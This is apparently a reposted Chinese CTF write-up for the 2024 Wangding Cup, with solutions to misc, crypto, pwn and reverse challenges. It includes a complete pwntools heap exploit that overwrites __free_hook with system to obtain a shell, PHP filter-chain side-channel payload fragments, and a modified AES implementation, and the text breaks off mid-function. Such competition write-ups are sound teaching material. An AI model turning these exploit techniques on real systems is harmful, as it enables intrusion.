# 2024第四届“网鼎杯”白虎组 writeup

> 原文: https://www.ctfiot.com/213306.html
> ID: 213306

Misc 

misc01

首先提取流量中所有的TEID

tshark -r UPF.cap -e "gtp.teid" -T fields | sed '/^s*$/d' &gt; upf.txt

然后对出现的TEID进行统计排序，发现两处发现异常报文的TEID

接着找到对应TEID的GTP流

将两处拼接得到flag

wdflag{18xxx23xxx}

misc02

观察GTP协议流量，推测TEID之后的数据即为加密流量，并且是使用所给的encrypted.py文件进行加密，即AES-ECB，后续经过尝试，将TEID作为key，可解出流量加密数据，写脚本一键提取请求包和响应包流量并进行解密，得到flag

misc03

侧信道攻击，参考这篇文章https://boogipop.com/2023/05/08/Web%E4%BE%A7%E4%BF%A1%E9%81%93%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/#DownUnderCTF2022-minimal-php

接着用tshark工具将流量包中的value和对应状态码提取，在python中转成字典格式，替换原脚本的网页请求

并修改原脚本两处地方

blow_up_enc = join(*['convert.quoted-printable-encode'] * 3000)

req(f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode|{blow_up_enc}|{trailer}'),

可以直接跑出flag

misc04

首先合并三个文件

cat 1 2 3 &gt; 1.zip

合并之后用binwalk可以看到有两个压缩包文件，其中2.png为伪加密，解压之后镜像可得到后一半flag

另一个压缩包根据提示!@#QQQ0010flag****进行掩码爆破爆破出后四位数字之后得到一张jpg，将jpg中的png分离，并爆破宽高可得到前一半flag

 Crypto 

CRYPTO01

解题思路

两个函数，P(x) = P * x,S(x) = A*x +b,

令 ,T = P^{-1}AP, U = P^{-1}b

则r = T^{14}x+(T^{13}+T^{12}+…+I)U+(T^{13}+T^{12}+…+I) P^{-1}k

因为flag头“wdflag{”7个字符，所以再爆破1个解上述方程，可得到列表keys，遍历keys后得到flag。

from Crypto.Util.number import * 

cipher_text = [] 
perm_indices = [] 
BLOCK_SIZE = 64 
ROUNDS = 14 

# Inverse permutation list
inverse_permutation = [perm_indices.index(i) for i in range(BLOCK_SIZE)] 

# Constants for the mask and IV
MASK = 0b1110001001111001000110010000100010101111101100101110100001001001 
IV = 7 

# Helper functions
binary_to_integer = lambda bits: Integer(sum([bits[i] * 2**i for i in range(len(bits))])) 

# Create the permutation matrix
P_matrix = matrix(GF(2), BLOCK_SIZE, BLOCK_SIZE) 
for i, perm_index in enumerate(perm_indices): 
    P_matrix[i, perm_index] = 1 

# Permutation function
def permute(x): 
    bit_x = x.bits() 
    if len(bit_x) < BLOCK_SIZE: 
        bit_x.extend([0] * (BLOCK_SIZE - len(bit_x))) 
    bit_x = P_matrix * vector(GF(2), bit_x) 
    return binary_to_integer(vector(ZZ, bit_x).list()) 

# Inverse permutation function
def inverse_permute(x): 
    bit_x = x.bits() 
    if len(bit_x) < BLOCK_SIZE: 
        bit_x.extend([0] * (BLOCK_SIZE - len(bit_x))) 
    bit_x = P_matrix.inverse() * vector(GF(2), bit_x) 
    return binary_to_integer(vector(ZZ, bit_x).list()) 

# Define matrix A and vector b based on IV and MASK
A_matrix = matrix(GF(2), BLOCK_SIZE, BLOCK_SIZE) 
for i in range(BLOCK_SIZE): 
    A_matrix[i, i] = 1 
for i in range(BLOCK_SIZE): 
    j = i - IV 
    if j >= 0: 
        A_matrix[i, j] = 1 

b_vector = vector(GF(2), BLOCK_SIZE) 
for i in range(BLOCK_SIZE): 
    if (MASK >> i) & 1: 
        b_vector[i] = 1 

# Substitution function
def substitute(x): 
    bit_x = x.bits() 
    if len(bit_x) < BLOCK_SIZE: 
        bit_x.extend([0] * (BLOCK_SIZE - len(bit_x))) 
    bit_x = vector(GF(2), bit_x) 
    result = A_matrix * bit_x + b_vector 
    return binary_to_integer(vector(ZZ, result)) 

# Define matrix transformations for decryption
T_matrix = P_matrix.inverse() * A_matrix * P_matrix 
U_vector = P_matrix.inverse() * b_vector 
sum_T_matrix = sum(T_matrix**i for i in range(ROUNDS)) 

# Key recovery
recovered_keys = [] 
for i in range(1, 32): 
    cipher_bits = cipher_text[-1].bits() 
    while len(cipher_bits) != BLOCK_SIZE: 
        cipher_bits += [0] 
    cipher_bits = vector(GF(2), cipher_bits) 
    
    message_bytes = bytes([i]) * 8 
    message_bits = Integer(bytes_to_long(message_bytes)).bits() 
    while len(message_bits) != BLOCK_SIZE: 
        message_bits += [0] 
    message_bits = vector(GF(2), message_bits) 
    
    cipher_bits -= T_matrix**ROUNDS * message_bits 
    cipher_bits -= sum_T_matrix * U_vector 
    try:     
        P_inverse_key = sum_T_matrix.solve_right(cipher_bits) 
        key = P_matrix * P_inverse_key 
        recovered_key = sum([int(key[j]) * 2**j for j in range(len(key))]) 
        recovered_keys.append(recovered_key) 
    except: 
        pass 

# Decryption function
def decrypt_block(cipher_block, key): 
    cipher_bits = cipher_block.bits() 
    key_bits = key.bits() 
    while len(cipher_bits) != BLOCK_SIZE: 
        cipher_bits += [0] 
    while len(key_bits) != BLOCK_SIZE: 
        key_bits += [0] 
    cipher_bits = vector(GF(2), cipher_bits) 
    key_bits = vector(GF(2), key_bits) 
    
    cipher_bits -= sum_T_matrix * P_matrix.inverse() * key_bits 
    cipher_bits -= sum_T_matrix * U_vector 
    decrypted_bits = (T_matrix**ROUNDS).inverse() * cipher_bits 
    message_bytes = long_to_bytes(binary_to_integer(vector(ZZ, decrypted_bits))) 
    return message_bytes 

# Attempt decryption with each recovered key
for key in recovered_keys: 
    decrypted_message = [decrypt_block(c, key) for c in cipher_text] 
    flag = b"".join(decrypted_message) 
    print(flag)

CRYPTO02

https://jayxv.github.io/2019/11/11/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%B5%85%E6%9E%90Pollard's%20rho%20algorithm%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8/

根据文章套板子直接打

Exp:

import libnum
from Crypto.Util.number import *
e = 65537
n = 49025724928152491719950645039355675823887062840095001672970308684156817293484070166684235178364916522473822184239221170514602692903302575847326054102901449806271709230774063675539139201327878971370342483682454617270705142999317092151456200639975738970405158598235961567646064089356496022247689989925574384915789399433283855087561428970245448888799812611301566886173165074558800757040196846800189738355799057422298556992606146766063202605288257843684190291545600282197788724944382475099313284546776350595539129553760118549158103804149179701853798084612143809757187033897573787135477889183344944579834942896249251191453
with open("cipher.txt", "rb") as f:
    c = f.read()
    c = libnum.s2n(c)
def gcd(a, b):
    while b:
        a, b = b, a%b
    return a
def mapx(x):
    x=(pow(x,n-1,n)+3)%n
    return x
def pollard_rho (x1,x2):
    while True:
        x1=mapx(x1)
        x2=mapx(mapx(x2))
        p=gcd(x1-x2,n)
        if (p == n):
            print("fail")
            return
        elif (p != 1):
            q = n // p
            phi = (p - 1) * (q - 1)
            d = inverse(e, phi)
            print(long_to_bytes(pow(c, d, n)))
            break
pollard_rho(1, 1)

 Pwn 

pwn01

Edit存在任意地址写x00，可以利用堆块错位申请打free_hook为system，free进tcachebin中的堆块会残留出libc_base和堆地址。之后修改fd最后一个字节为x00触发漏洞，攻击free_hook获取shell

Add show, free,edit三个功能函数，实际上edit只能用一次任意地址写

利用指针残留获得heap_base,libc_base

Edit攻击目标地址-3，完成x00修改fd位

之后触发tcachebin的整理机制完成tcachebin attack的操作

from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr():
        return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
#p=remote('',)
p = process('./pwn')
def add(size,content):
        rl("Input your choice")
        sl(str(1))
        rl("Size :")
        sl(str(size))
        rl("Content :")
        s(content)
def free(i):
        rl("Input your choice")
        sl(str(2))
        rl("Index :")
        sl(str(i))
def show(i):
        rl("Input your choice")
        sl(str(4))
        rl("Index :")
        sl(str(i))
def edit(content):
        rl("Input your choice")
        sl(str(3))
        rl("content :")
        s(content)
 
add(0x98,b'a')
add(0x98,b'a')
add(0x98,b'a') #2
add(0x410,b'a')
add(0x98,b'a') #4
 
free(3)
add(0x410,b'a'*8) #5
show(5)
libc_base=get_addr()-2018272
li(hex(libc_base))
free_hook=libc_base+0x1eee48
system=libc_base+0x52290
free(5)
 
add(0x600,b'a')  #6
add(0x410,b'a'*0x10) #7
show(7)
rl("a"*0x10)
heap_base=u64(p.recv(6).ljust(8,b'x00'))-0x470
li(hex(heap_base))
 
add(0x140,b'/bin/shx00') #8
add(0x98,b'a') #9
add(0xa8,b'a') #10
add(0x98,b'a') #11
add(0xa8,b'a') #12
 
free(11)
free(0)
free(12)
free(10)
edit(p64(heap_base+0x290+8+5))
add(0x98,b'a')
add(0x98,b'a'*0x38+p64(0xb1)+p64(free_hook))
add(0xa8,b'a')
add(0xa8,p64(system))
 
free(8)
p.sendline(b"cat flag")
#print(p.recvline())
 
inter()        

 Reverse 

re01

打开so文件，发现JNI_Onload 无法正确F5

在0x00000000001B4E0附近发现了间接跳转， 实际BR X8是跳转到下一条指令，所以这是花指令，直接NOP掉即可。

除开这种指令以外，还发现了这种间接跳转，这也是花指令，需要NOP掉

将上述字节全部替换完后，逆向发现

在init_array中hook了JNI_OnLoad，以及Hook了RegisterNative方法，使真正的native函数为sub_1A9A8

这个函数进行了魔改的AES操作，修改了Sbox。

然后将MixColumn和ShiftRows 交换了顺序

# print(key)
sbox = [0xED, 0xF6, 0xDC, 0x13, 0xA7, 0xB9, 0x3A, 0x75, 0x65, 0x45,
 0xA5, 0x9A, 0x1B, 0xC3, 0xE5, 0xAF, 0xBB, 0x6F, 0xAC, 0x69,
 0xF5, 0xB0, 0xE7, 0x8D, 0x9C, 0x55, 0x79, 0x24, 0xD5, 0xBD,
 0x06, 0xD0, 0xA9, 0x9F, 0x52, 0x10, 0x83, 0x0A, 0x72, 0x19,
 0x50, 0xF1, 0x5A, 0x99, 0x32, 0x73, 0x56, 0xCE, 0x2E, 0xD8,
 0xCB, 0x07, 0x63, 0xB8, 0xA1, 0x70, 0xF9, 0xE1, 0x3E, 0xCF,
 0xEB, 0xC2, 0xB3, 0xE8, 0xA0, 0x7F, 0xE0, 0xFD, 0x4F, 0x31,
 0x87, 0xA2, 0x95, 0xAD, 0x47, 0x0F, 0x90, 0x1E, 0x18, 0x86,
 0x0E, 0x27, 0x3C, 0x82, 0x1F, 0xFF, 0x17, 0x36, 0xBA, 0xF3,
 0xC5, 0x54, 0x96, 0x29, 0x04, 0x2B, 0x67, 0x33, 0x0D, 0x42,
 0xE9, 0xF2, 0x44, 0x0B, 0xEA, 0x51, 0xE3, 0x4D, 0xFC, 0x26,
 0xC7, 0x7E, 0x74, 0x91, 0xE6, 0x7A, 0xD9, 0x16, 0x30, 0xA8,
 0x57, 0x60, 0x8C, 0x21, 0x61, 0x5D, 0x76, 0x2F, 0x03, 0x64,
 0xB2, 0xA6, 0x8A, 0x8F, 0xB7, 0xEC, 0x1A, 0x7C, 0x88, 0xAE,
 0x39, 0xAA, 0x59, 0x66, 0x6D, 0x2A, 0xFA, 0x4A, 0x40, 0xC8,
 0xC0, 0x12, 0x98, 0x4C, 0x85, 0x6A, 0x05, 0x23, 0xDA, 0x43,
 0xD3, 0x84, 0x78, 0x3F, 0x6C, 0xD2, 0x6E, 0x68, 0x22, 0x9D,
 0xF4, 0x58, 0xB6, 0xA3, 0x62, 0x4E, 0x34, 0xD7, 0xF0, 0x53,
 0xB1, 0xC6, 0x77, 0x5F, 0x48, 0x7D, 0x5E, 0x08, 0xE2, 0x71,
 0x11, 0xDB, 0xFE, 0x81, 0xCD, 0xF7, 0x15, 0xEF, 0x01, 0x9B,
 0x3D, 0x28, 0xB4, 0x38, 0xBC, 0xD6, 0x41, 0x93, 0xDD, 0xBF,
 0x09, 0x92, 0xEE, 0xCC, 0xE4, 0x14, 0x8E, 0x5B, 0xBE, 0x7B,
 0x5C, 0xAB, 0x37, 0xDF, 0xFB, 0x6B, 0x2D, 0xC1, 0x8B, 0xC9,
 0xD1, 0x80, 0x2C, 0x94, 0x00, 0x25, 0x35, 0x4B, 0xD4, 0x3B,
 0x49, 0x02, 0xF8, 0xA4, 0x46, 0x1C, 0x89, 0x0C, 0x97, 0xDE,
 0x20, 0xCA, 0x9E, 0x1D, 0xC4, 0xB5]
rsbox = [0] * 256
for i in range(256):
 rsbox[sbox[i]] = i
print(rsbox)

C代码如下：

main.cpp

#include <stdio.h>
#include "aes.hpp"

uint8_t Buf[48] = { };//密文 

int main()
{
 uint8_t key[16] = {
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A,
  0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10 };

 AES_ctx aes_ctx;
 // AES_init_ctx_iv(&aes_ctx, key, key);
 // AES_CBC_encrypt_buffer(&aes_ctx, Buf, 48);
 AES_init_ctx_iv(&aes_ctx, key, key);
 AES_CBC_decrypt_buffer(&aes_ctx, Buf, 48);

 printf("%sn", Buf);

}

AES.cpp

/*

This is an implementation of the AES algorithm, specifically ECB, CTR and CBC mode.
Block size can be chosen in aes.h - available choices are AES128, AES192, AES256.

The implementation is verified against the test vectors in:
  National Institute of Standards and Technology Special Publication 800-38A 2001 ED

ECB-AES128
----------

  plain-text:
    6bc1bee22e409f96e93d7e117393172a
    ae2d8a571e03ac9c9eb76fac45af8e51
    30c81c46a35ce411e5fbc1191a0a52ef
    f69f2445df4f9b17ad2b417be66c3710

  key:
    2b7e151628aed2a6abf7158809cf4f3c

  resulting cipher
    3ad77bb40d7a3660a89ecaf32466ef97 
    f5d3d58503b9699de785895a96fdbaaf 
    43b1cd7f598ece23881b00e3ed030688 
    7b0c785e27e8ad3f8223207104725dd4 

NOTE:   String length must be evenly divisible by 16byte (str_len % 16 == 0)
        You should pad the end of the string with zeros if this is not the case.
        For AES192/256 the key size is proportionally larger.

*/

/*****************************************************************************/
/* Includes:                                                                 */
/*****************************************************************************/
#include <string.h> // CBC mode, for memset
#include "aes.h"

#include <stdio.h>

/*****************************************************************************/
/* Defines:                                                                  */
/*****************************************************************************/
// The number of columns comprising a state in AES. This is a constant in AES. Value=4
#define Nb 4

#if defined(AES256) && (AES256 == 1)
    #define Nk 8
    #define Nr 14
#elif defined(AES192) && (AES192 == 1)
    #define Nk 6
    #define Nr 12
#else
    #define Nk 4        // The number of 32 bit words in a key.
    #define Nr 10       // The number of rounds in AES Cipher.
#endif

// jcallan@github points out that declaring Multiply as a function 
// reduces code size considerably with the Keil ARM compiler.
// See this link for more information: https://github.com/kokke/tiny-AES-C/pull/3
#ifndef MULTIPLY_AS_A_FUNCTION
  #define MULTIPLY_AS_A_FUNCTION 0
#endif

/*****************************************************************************/
/* Private variables:                                                        */
/*****************************************************************************/
// state - array holding the intermediate results during decryption.
typedef uint8_t state_t[4][4];

// The lookup-tables are marked const so they can be placed in read-only storage instead of RAM
// The numbers below can be computed dynamically trading ROM for RAM - 
// This can be useful in (embedded) bootloader applications, where ROM is often limited.
static const uint8_t sbox[256] = {
  //0     1    2      3     4    5     6     7      8    9     A      B    C     D     E     F
 0xED, 0xF6, 0xDC, 0x13, 0xA7, 0xB9, 0x3A, 0x75, 0x65, 0x45,
  0xA5, 0x9A, 0x1B, 0xC3, 0xE5, 0xAF, 0xBB, 0x6F, 0xAC, 0x69,
  0xF5, 0xB0, 0xE7, 0x8D, 0x9C, 0x55, 0x79, 0x24, 0xD5, 0xBD,
  0x06, 0xD0, 0xA9, 0x9F, 0x52, 0x10, 0x83, 0x0A, 0x72, 0x19,
  0x50, 0xF1, 0x5A, 0x99, 0x32, 0x73, 0x56, 0xCE, 0x2E, 0xD8,
  0xCB, 0x07, 0x63, 0xB8, 0xA1, 0x70, 0xF9, 0xE1, 0x3E, 0xCF,
  0xEB, 0xC2, 0xB3, 0xE8, 0xA0, 0x7F, 0xE0, 0xFD, 0x4F, 0x31,
  0x87, 0xA2, 0x95, 0xAD, 0x47, 0x0F, 0x90, 0x1E, 0x18, 0x86,
  0x0E, 0x27, 0x3C, 0x82, 0x1F, 0xFF, 0x17, 0x36, 0xBA, 0xF3,
  0xC5, 0x54, 0x96, 0x29, 0x04, 0x2B, 0x67, 0x33, 0x0D, 0x42,
  0xE9, 0xF2, 0x44, 0x0B, 0xEA, 0x51, 0xE3, 0x4D, 0xFC, 0x26,
  0xC7, 0x7E, 0x74, 0x91, 0xE6, 0x7A, 0xD9, 0x16, 0x30, 0xA8,
  0x57, 0x60, 0x8C, 0x21, 0x61, 0x5D, 0x76, 0x2F, 0x03, 0x64,
  0xB2, 0xA6, 0x8A, 0x8F, 0xB7, 0xEC, 0x1A, 0x7C, 0x88, 0xAE,
  0x39, 0xAA, 0x59, 0x66, 0x6D, 0x2A, 0xFA, 0x4A, 0x40, 0xC8,
  0xC0, 0x12, 0x98, 0x4C, 0x85, 0x6A, 0x05, 0x23, 0xDA, 0x43,
  0xD3, 0x84, 0x78, 0x3F, 0x6C, 0xD2, 0x6E, 0x68, 0x22, 0x9D,
  0xF4, 0x58, 0xB6, 0xA3, 0x62, 0x4E, 0x34, 0xD7, 0xF0, 0x53,
  0xB1, 0xC6, 0x77, 0x5F, 0x48, 0x7D, 0x5E, 0x08, 0xE2, 0x71,
  0x11, 0xDB, 0xFE, 0x81, 0xCD, 0xF7, 0x15, 0xEF, 0x01, 0x9B,
  0x3D, 0x28, 0xB4, 0x38, 0xBC, 0xD6, 0x41, 0x93, 0xDD, 0xBF,
  0x09, 0x92, 0xEE, 0xCC, 0xE4, 0x14, 0x8E, 0x5B, 0xBE, 0x7B,
  0x5C, 0xAB, 0x37, 0xDF, 0xFB, 0x6B, 0x2D, 0xC1, 0x8B, 0xC9,
  0xD1, 0x80, 0x2C, 0x94, 0x00, 0x25, 0x35, 0x4B, 0xD4, 0x3B,
  0x49, 0x02, 0xF8, 0xA4, 0x46, 0x1C, 0x89, 0x0C, 0x97, 0xDE,
  0x20, 0xCA, 0x9E, 0x1D, 0xC4, 0xB5 };

#if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
static const uint8_t rsbox[256] = {
 234, 198, 241, 128, 94, 156, 30, 51, 187, 210, 37, 103, 247, 98, 80, 75, 35, 190, 151, 3, 215, 196, 117, 86, 78, 39, 136, 12, 245, 253, 77, 84, 250, 123, 168, 157, 27, 235, 109, 81, 201, 93, 145, 95, 232, 226, 48, 127, 118, 69, 44, 97, 176, 236, 87, 222, 203, 140, 6, 239, 82, 200, 58, 163, 148, 206, 99, 159, 102, 9, 244, 74, 184, 240, 147, 237, 153, 107, 175, 68, 40, 105, 34, 179, 91, 25, 46, 120, 171, 142, 42, 217, 220, 125, 186, 183, 121, 124, 174, 52, 129, 8, 143, 96, 167, 19, 155, 225, 164, 144, 166, 17, 55, 189, 38, 45, 112, 7, 126, 182, 162, 26, 115, 219, 137, 185, 111, 65, 231, 193, 83, 36, 161, 154, 79, 70, 138, 246, 132, 228, 122, 23, 216, 133, 76, 113, 211, 207, 233, 72, 92, 248, 152, 43, 11, 199, 24, 169, 252, 33, 64, 54, 71, 173, 243, 10, 131, 4, 119, 32, 141, 221, 18, 73, 139, 15, 21, 180, 130, 62, 202, 255, 172, 134, 53, 5, 88, 16, 204, 29, 218, 209, 150, 227, 61, 13, 254, 90, 181, 110, 149, 229, 251, 50, 213, 194, 47, 59, 31, 230, 165, 160, 238, 28, 205, 177, 49, 116, 158, 191, 2, 208, 249, 223, 66, 57, 188, 106, 214, 14, 114, 22, 63, 100, 104, 60, 135, 0, 212, 197, 178, 41, 101, 89, 170, 20, 1, 195, 242, 56, 146, 224, 108, 67, 192, 85 };
#endif

// The round constant word array, Rcon[i], contains the values given by 
// x to the power (i-1) being powers of x (x is denoted as {02}) in the field GF(2^8)
static const uint8_t Rcon[11] = {
  0x8d, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36 };

/*
 * Jordan Goulder points out in PR #12 (https://github.com/kokke/tiny-AES-C/pull/12),
 * that you can remove most of the elements in the Rcon array, because they are unused.
 *
 * From Wikipedia's article on the Rijndael key schedule @ https://en.wikipedia.org/wiki/Rijndael_key_schedule#Rcon
 * 
 * "Only the first some of these constants are actually used – up to rcon[10] for AES-128 (as 11 round keys are needed), 
 *  up to rcon[8] for AES-192, up to rcon[7] for AES-256. rcon[0] is not used in AES algorithm."
 */

/*****************************************************************************/
/* Private functions:                                                        */
/*****************************************************************************/
/*
static uint8_t getSBoxValue(uint8_t num)
{
  return sbox[num];
}
*/
#define getSBoxValue(num) (sbox[(num)])

// This function produces Nb(Nr+1) round keys. The round keys are used in each round to decrypt the states. 
static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)
{
  unsigned i, j, k;
  uint8_t tempa[4]; // Used for the column/row operations
  
  // The first round key is the key itself.
  for (i = 0; i < Nk; ++i)
  {
    RoundKey[(i * 4) + 0] = Key[(i * 4) + 0];
    RoundKey[(i * 4) + 1] = Key[(i * 4) + 1];
    RoundKey[(i * 4) + 2] = Key[(i * 4) + 2];
    RoundKey[(i * 4) + 3] = Key[(i * 4) + 3];
  }

  // All other round keys are found from the previous round keys.
  for (i = Nk; i < Nb * (Nr + 1); ++i)
  {
    {
      k = (i - 1) * 4;
      tempa[0]=RoundKey[k + 0];
      tempa[1]=RoundKey[k + 1];
      tempa[2]=RoundKey[k + 2];
      tempa[3]=RoundKey[k + 3];

    }

    if (i % Nk == 0)
    {
      // This function shifts the 4 bytes in a word to the left once.
      // [a0,a1,a2,a3] becomes [a1,a2,a3,a0]

      // Function RotWord()
      {
        const uint8_t u8tmp = tempa[0];
        tempa[0] = tempa[1];
        tempa[1] = tempa[2];
        tempa[2] = tempa[3];
        tempa[3] = u8tmp;
      }

      // SubWord() is a function that takes a four-byte input word and 
      // applies the S-box to each of the four bytes to produce an output word.

      // Function Subword()
      {
        tempa[0] = getSBoxValue(tempa[0]);
        tempa[1] = getSBoxValue(tempa[1]);
        tempa[2] = getSBoxValue(tempa[2]);
        tempa[3] = getSBoxValue(tempa[3]);
      }

      tempa[0] = tempa[0] ^ Rcon[i/Nk];
    }
#if defined(AES256) && (AES256 == 1)
    if (i % Nk == 4)
    {
      // Function Subword()
      {
        tempa[0] = getSBoxValue(tempa[0]);
        tempa[1] = getSBoxValue(tempa[1]);
        tempa[2] = getSBoxValue(tempa[2]);
        tempa[3] = getSBoxValue(tempa[3]);
      }
    }
#endif
    j = i * 4; k=(i - Nk) * 4;
    RoundKey[j + 0] = RoundKey[k + 0] ^ tempa[0];
    RoundKey[j + 1] = RoundKey[k + 1] ^ tempa[1];
    RoundKey[j + 2] = RoundKey[k + 2] ^ tempa[2];
    RoundKey[j + 3] = RoundKey[k + 3] ^ tempa[3];
  }
}

void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key)
{
  KeyExpansion(ctx->RoundKey, key);
}
#if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv)
{
  KeyExpansion(ctx->RoundKey, key);
  memcpy (ctx->Iv, iv, AES_BLOCKLEN);
}
void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv)
{
  memcpy (ctx->Iv, iv, AES_BLOCKLEN);
}
#endif

// This function adds the round key to state.
// The round key is added to the state by an XOR function.
static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey)
{
  uint8_t i,j;
  for (i = 0; i < 4; ++i)
  {
    for (j = 0; j < 4; ++j)
    {
      (*state)[i][j] ^= RoundKey[(round * Nb * 4) + (i * Nb) + j];
    }
  }
}

// The SubBytes Function Substitutes the values in the
// state matrix with values in an S-box.
static void SubBytes(state_t* state)
{
  uint8_t i, j;
  for (i = 0; i < 4; ++i)
  {
    for (j = 0; j < 4; ++j)
    {
      (*state)[j][i] = getSBoxValue((*state)[j][i]);
    }
  }
}

// The ShiftRows() function shifts the rows in the state to the left.
// Each row is shifted with different offset.
// Offset = Row number. So the first row is not shifted.
static void ShiftRows(state_t* state)
{
  uint8_t temp;

  // Rotate first row 1 columns to left  
  temp           = (*state)[0][1];
  (*state)[0][1] = (*state)[1][1];
  (*state)[1][1] = (*state)[2][1];
  (*state)[2][1] = (*state)[3][1];
  (*state)[3][1] = temp;

  // Rotate second row 2 columns to left  
  temp           = (*state)[0][2];
  (*state)[0][2] = (*state)[2][2];
  (*state)[2][2] = temp;

  temp           = (*state)[1][2];
  (*state)[1][2] = (*state)[3][2];
  (*state)[3][2] = temp;

  // Rotate third row 3 columns to left
  temp           = (*state)[0][3];
  (*state)[0][3] = (*state)[3][3];
  (*state)[3][3] = (*state)[2][3];
  (*state)[2][3] = (*state)[1][3];
  (*state)[1][3] = temp;
}

static uint8_t xtime(uint8_t x)
{
  return ((x<<1) ^ (((x>>7) & 1) * 0x1b));
}

// MixColumns function mixes the columns of the state matrix
static void MixColumns(state_t* state)
{
  uint8_t i;
  uint8_t Tmp, Tm, t;
  for (i = 0; i < 4; ++i)
  {  
    t   = (*state)[i][0];
    Tmp = (*state)[i][0] ^ (*state)[i][1] ^ (*state)[i][2] ^ (*state)[i][3] ;
    Tm  = (*state)[i][0] ^ (*state)[i][1] ; Tm = xtime(Tm);  (*state)[i][0] ^= Tm ^ Tmp ;
    Tm  = (*state)[i][1] ^ (*state)[i][2] ; Tm = xtime(Tm);  (*state)[i][1] ^= Tm ^ Tmp ;
    Tm  = (*state)[i][2] ^ (*state)[i][3] ; Tm = xtime(Tm);  (*state)[i][2] ^= Tm ^ Tmp ;
    Tm  = (*state)[i][3] ^ t ;              Tm = xtime(Tm);  (*state)[i][3] ^= Tm ^ Tmp ;
  }
}

// Multiply is used to multiply numbers in the field GF(2^8)
// Note: The last call to xtime() is unneeded, but often ends up generating a smaller binary
//       The compiler seems to be able to vectorize the operation better this way.
//       See https://github.com/kokke/tiny-AES-c/pull/34
#if MULTIPLY_AS_A_FUNCTION
static uint8_t Multiply(uint8_t x, uint8_t y)
{
  return (((y & 1) * x) ^
       ((y>>1 & 1) * xtime(x)) ^
       ((y>>2 & 1) * xtime(xtime(x))) ^
       ((y>>3 & 1) * xtime(xtime(xtime(x)))) ^
       ((y>>4 & 1) * xtime(xtime(xtime(xtime(x)))))); /* this last call to xtime() can be omitted */
  }
#else
#define Multiply(x, y)                                
      (  ((y & 1) * x) ^                              
      ((y>>1 & 1) * xtime(x)) ^                       
      ((y>>2 & 1) * xtime(xtime(x))) ^                
      ((y>>3 & 1) * xtime(xtime(xtime(x)))) ^         
      ((y>>4 & 1) * xtime(xtime(xtime(xtime(x))))))   

#endif

#if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
/*
static uint8_t getSBoxInvert(uint8_t num)
{
  return rsbox[num];
}
*/
#define getSBoxInvert(num) (rsbox[(num)])

// MixColumns function mixes the columns of the state matrix.
// The method used to multiply may be difficult to understand for the inexperienced.
// Please use the references to gain more information.
static void InvMixColumns(state_t* state)
{
  int i;
  uint8_t a, b, c, d;
  for (i = 0; i < 4; ++i)
  { 
    a = (*state)[i][0];
    b = (*state)[i][1];
    c = (*state)[i][2];
    d = (*state)[i][3];

    (*state)[i][0] = Multiply(a, 0x0e) ^ Multiply(b, 0x0b) ^ Multiply(c, 0x0d) ^ Multiply(d, 0x09);
    (*state)[i][1] = Multiply(a, 0x09) ^ Multiply(b, 0x0e) ^ Multiply(c, 0x0b) ^ Multiply(d, 0x0d);
    (*state)[i][2] = Multiply(a, 0x0d) ^ Multiply(b, 0x09) ^ Multiply(c, 0x0e) ^ Multiply(d, 0x0b);
    (*state)[i][3] = Multiply(a, 0x0b) ^ Multiply(b, 0x0d) ^ Multiply(c, 0x09) ^ Multiply(d, 0x0e);
  }
}

// The SubBytes Function Substitutes the values in the
// state matrix with values in an S-box.
static void InvSubBytes(state_t* state)
{
  uint8_t i, j;
  for (i = 0; i < 4; ++i)
  {
    for (j = 0; j < 4; ++j)
    {
      (*state)[j][i] = getSBoxInvert((*state)[j][i]);
    }
  }
}

static void InvShiftRows(state_t* state)
{
  uint8_t temp;

  // Rotate first row 1 columns to right  
  temp = (*state)[3][1];
  (*state)[3][1] = (*state)[2][1];
  (*state)[2][1] = (*state)[1][1];
  (*state)[1][1] = (*state)[0][1];
  (*state)[0][1] = temp;

  // Rotate second row 2 columns to right 
  temp = (*state)[0][2];
  (*state)[0][2] = (*state)[2][2];
  (*state)[2][2] = temp;

  temp = (*state)[1][2];
  (*state)[1][2] = (*state)[3][2];
  (*state)[3][2] = temp;

  // Rotate third row 3 columns to right
  temp = (*state)[0][3];
